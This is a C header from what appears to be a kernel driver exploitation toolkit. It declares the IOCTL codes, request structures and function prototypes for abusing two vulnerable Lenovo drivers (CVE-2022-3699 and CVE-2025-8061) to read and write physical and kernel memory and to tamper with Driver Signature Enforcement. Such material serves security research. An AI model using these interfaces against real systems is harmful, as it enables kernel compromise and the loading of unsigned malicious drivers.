/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023 - 2026
*
*  TITLE:       LENOVO.H
*
*  VERSION:     1.47
*
*  DATE:        25 Mar 2026
*
*  Lenovo drivers interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// CVE-2022-3699
//

#define LENOVO_DEVICE_TYPE       (DWORD)FILE_DEVICE_UNKNOWN

#define LDD_READ_PHYSMEM_FUNCID  (DWORD)0x804
#define LDD_WRITE_PHYSMEM_FUNCID (DWORD)0x805


#define IOCTL_LDD_READ_PHYSICAL_MEMORY      \
    CTL_CODE(LENOVO_DEVICE_TYPE, LDD_READ_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222010

#define IOCTL_LDD_WRITE_PHYSICAL_MEMORY    \
    CTL_CODE(LENOVO_DEVICE_TYPE, LDD_WRITE_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS) //0x222014

typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT) _LDD_READ_REQUEST {
    PHYSICAL_ADDRESS Address;
    ULONG Size; // 1, 2, 4, 8 bytes
} LDD_READ_REQUEST, * PLDD_READ_REQUEST;

typedef struct _LDD_WRITE_REQUEST {
    PHYSICAL_ADDRESS Address;
    ULONG Size; // 1, 2, 4, 8 bytes
    ULONG Unused; //align
    ULONG_PTR Data; //pointer to data
} LDD_WRITE_REQUEST, * PLDD_WRITE_REQUEST;

BOOL WINAPI LddReadWritePhysicalMemoryStub(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LddRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param);

BOOL WINAPI LddpVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL LddControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address);

_Success_(return != FALSE)
BOOL WINAPI LddReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LddWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);

//
// CVE-2025-8061
//

#define LNVMSRIO_DEVICE_TYPE            (DWORD)0x9C40

#define LNVMSRIO_GET_VERSION_FUNCID     (DWORD)0x800   // 2048
#define LNVMSRIO_READ_PHYSMEM_FUNCID    (DWORD)0x841   // 2113
#define LNVMSRIO_WRITE_PHYSMEM_FUNCID   (DWORD)0x842   // 2114

#define IOCTL_LNVMSRIO_GET_VERSION              \
    CTL_CODE(LNVMSRIO_DEVICE_TYPE, LNVMSRIO_GET_VERSION_FUNCID, METHOD_BUFFERED, FILE_ANY_ACCESS)   // 0x9C402000

#define IOCTL_LNVMSRIO_READ_PHYSICAL_MEMORY     \
    CTL_CODE(LNVMSRIO_DEVICE_TYPE, LNVMSRIO_READ_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_READ_DATA)   // 0x9C406104

#define IOCTL_LNVMSRIO_WRITE_PHYSICAL_MEMORY    \
    CTL_CODE(LNVMSRIO_DEVICE_TYPE, LNVMSRIO_WRITE_PHYSMEM_FUNCID, METHOD_BUFFERED, FILE_WRITE_DATA) // 0x9C40A108

typedef struct _LNVMSRIO_PHYS_READ_REQUEST {
    ULONG64 PhysicalAddress;
    ULONG AccessSize;
    ULONG Count;
} LNVMSRIO_PHYS_READ_REQUEST, * PLNVMSRIO_PHYS_READ_REQUEST;

typedef struct _LNVMSRIO_PHYS_WRITE_REQUEST {
    ULONG64 PhysicalAddress;
    ULONG AccessSize;
    ULONG Count;
    UCHAR Data[1];
} LNVMSRIO_PHYS_WRITE_REQUEST, * PLNVMSRIO_PHYS_WRITE_REQUEST;

BOOL WINAPI LnvMsrReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LnvMsrWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LnvMsrVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress);

BOOL WINAPI LnvMsrReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI LnvMsrWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);
